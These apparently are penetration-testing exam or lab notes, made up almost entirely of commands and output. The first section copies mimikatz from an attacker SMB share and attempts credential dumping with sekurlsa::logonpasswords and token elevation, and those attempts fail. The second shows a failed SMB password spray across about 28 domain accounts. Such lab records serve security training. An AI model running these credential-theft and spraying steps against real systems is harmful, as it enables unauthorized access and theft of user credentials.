# Mimikatz

```powershell
PS C:\Users\Administrator> net use \\192.168.49.104\share /user:username pw
The command completed successfully.

PS C:\Users\Administrator> cp \\192.168.49.104\share\mimikatz.exe .
PS C:\Users\Administrator> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # log logonpasswords.txt
Using 'logonpasswords.txt' for logfile : OK

mimikatz # sekurlsa::logonpasswords
ERROR kuhl_m_sekurlsa_acquireLSA ; Logon list

mimikatz # sekurlsa::logonpasswords
ERROR kuhl_m_sekurlsa_acquireLSA ; Logon list

mimikatz # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

700     {0;000003e7} 1 D 43270          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
 -> Impersonated !
 * Process Token : {0;00e24f5d} 3 D 16065372    WS26\Administrator      S-1-5-21-2756297892-2186407355-380279769-500    (14g,25p)       Primary
 * Thread Token  : {0;000003e7} 1 D 16177523    NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)

mimikatz # sekurlsa::logonpasswords
ERROR kuhl_m_sekurlsa_acquireLSA ; Logon list

mimikatz #
```

---





---

# Admin Password spray -> 失敗

```sh
┌──(koshi㉿kali)-[~/Exam/AD/AD_Common]
└─$ nxc smb $TargetIP -u usernames.txt -p CarHammerChip964 --continue-on-success
SMB         172.16.104.202  445    SRV22            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SRV22) (domain:oscp.exam) (signing:False) (SMBv1:False)
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\C.ROGERS@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\ADMINISTRATOR@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\U.GREGORY@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\C.DEAN@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\O.HUGHES@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\P.GETHIN@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\T.FUCHS@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\B.WILLIAMS@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\V.SKINNER@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\G.JARVIS@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\M.NEWMAN@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\J.KOLE@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\S.TUCKER@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\L.EVGENY@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\R.ANDREWS@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\R.GALLAGHER@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\S.FISCHER@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\K.FREEMAN@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\B.CROSS@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\E.DDWARDS@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\D.HALL@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\F.HATFIELD@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\B.MARTIN@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\V.PERRY@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\A.BAILEY@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\W.BYRD@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\IUSR@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 

```